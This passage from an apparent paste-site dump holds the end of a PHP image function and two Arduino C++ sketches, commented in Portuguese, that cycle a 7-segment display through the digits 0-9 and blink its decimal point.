    }
    
    $img->drawImage($draw);
    return $img;
}
?>
"
dfQTqeti,codigo resumido,Ultizin,C++,Monday 29th of April 2024 04:50:55 PM CDT,"// Definições das constantes para os pinos do display de 7 segmentos
const int pinosDisplay[8] = {8, 9, 3, 4, 5, 7, 6, 2};

void setup() {
  // Define todos os pinos do display como saída
  for (int i = 0; i < 8; i++) {
    pinMode(pinosDisplay[i], OUTPUT);
  }
  
  // Inicia com o display desligado
  desligarDisplay();
}

void loop() {
  // Loop para a passagem dos 10 dígitos (0-9)
  for (int digito = 0; digito < 10; digito++) {
    // Define quais segmentos devem estar ligados para cada dígito
    definirSegmentos(digito);
    
    // Liga e desliga de forma alternada o ponto
    digitalWrite(pinosDisplay[7], !digitalRead(pinosDisplay[7]));
    
    // Aguarda 1 segundo para trocar de dígito
    delay(1000);
    
    // Apaga todos os segmentos para apresentar o próximo dígito
    desligarDisplay();
  }
}

// Função para desligar todos os segmentos do display
void desligarDisplay() {
  for (int i = 0; i < 7; i++) {
    digitalWrite(pinosDisplay[i], HIGH);
  }
}

// Função para definir quais segmentos devem estar ligados para cada dígito
void definirSegmentos(int digito) {
  // Tabela de segmentos para cada dígito (0-9)
  const bool segmentos[10][7] = {
    {LOW, LOW, LOW, LOW, LOW, LOW, HIGH},  // 0
    {HIGH, LOW, LOW, HIGH, HIGH, HIGH, HIGH}, // 1
    {LOW, LOW, HIGH, LOW, LOW, HIGH, LOW},  // 2
    {LOW, LOW, LOW, LOW, HIGH, HIGH, LOW},  // 3
    {HIGH, LOW, LOW, HIGH, HIGH, LOW, LOW}, // 4
    {LOW, HIGH, LOW, LOW, HIGH, LOW, LOW},  // 5
    {LOW, HIGH, LOW, LOW, LOW, LOW, LOW},   // 6
    {LOW, LOW, LOW, HIGH, HIGH, HIGH, HIGH},// 7
    {LOW, LOW, LOW, LOW, LOW, LOW, LOW},    // 8
    {LOW, LOW, LOW, HIGH, HIGH, LOW, LOW}   // 9
  };
  
  // Define os segmentos conforme o dígito atual
  for (int i = 0; i < 7; i++) {
    digitalWrite(pinosDisplay[i], segmentos[digito][i]);
  }
}"
hLTVeJs7,código do governo,Ultizin,C++,Monday 29th of April 2024 04:50:16 PM CDT,"#define a 8 
#define b 9 
#define c 3 
#define d 4 
#define e 5 
#define f 7 
#define g 6 
#define ponto 2

void setup() {
  /* Define os pinos como saída.                          */
  pinMode(a, OUTPUT);
  pinMode(b, OUTPUT);
  pinMode(c, OUTPUT);
  pinMode(d, OUTPUT);
  pinMode(e, OUTPUT);
  pinMode(f, OUTPUT);
  pinMode(g, OUTPUT);
  pinMode(ponto, OUTPUT);

  /* Inicia com o display desligado.                      */
  digitalWrite(a, HIGH);
  digitalWrite(b, HIGH);
  digitalWrite(c, HIGH);
  digitalWrite(d, HIGH);
  digitalWrite(e, HIGH);
  digitalWrite(f, HIGH);
  digitalWrite(g, HIGH);
}
void loop() {
  /* Loop para a passagem dos 10 dígitos (0-9).           */
  for (int digito = 0; digito < 10; digito++)
  {
    /* Condição para ligar o segmento a.                  */
    /* Se o digito não for 1 e 4, faça...                 */
    if (digito != 1 && digito != 4)
      digitalWrite(a, LOW);
    /* Condição para ligar o segmento b.                  */
    /* Se o digito não for 5 e 6, faça...                 */
    if (digito != 5 && digito != 6)
      digitalWrite(b, LOW);
    /* Condição para ligar o segmento c.                  */
    /* Se o digito não for 2, faça...                     */
    if (digito != 2)
      digitalWrite(c, LOW);
    /* Condição para ligar o segmento d.                  */
    /* Se o digito não for 1, 4 e 7 faça...               */
    if (digito != 1 && digito != 4 && digito != 7)
      digitalWrite(d, LOW);
    /* Condição para ligar o segmento e                           */
    /* Se o digito for 2 ou 6 ou 8 ou 0, faça...                  */
    if (digito == 2 || digito == 6 || digito == 8 || digito == 0)
      digitalWrite(e, LOW);
    /* Condição para ligar o segmento f                           */
    /* Se o digito não for 1, 2, 3 e 7 faça...                    */
    if (digito != 1 && digito != 2 && digito != 3 && digito != 7)
      digitalWrite(f, LOW);
    /* Condição para ligar o segmento d.                          */
    /* Se o digito não for 0, 1 e 7 faça...                       */
    if (digito != 0 && digito != 1 && digito != 7)
      digitalWrite(g, LOW);
    /* Liga e desliga de forma alternada o ponto.                 */
    digitalWrite(ponto, !digitalRead(ponto));
    /* Aguarda 1 segundo para trocar de dígito.                   */
    delay(1000);
    /* Apaga todos os segmentos para apresentar o próximo dígito */
    digitalWrite(a, HIGH);
    digitalWrite(b, HIGH);
    digitalWrite(c, HIGH);
    digitalWrite(d, HIGH);
    digitalWrite(e, HIGH);
    digitalWrite(f, HIGH);
    digitalWrite(g, HIGH);
  }
}
"
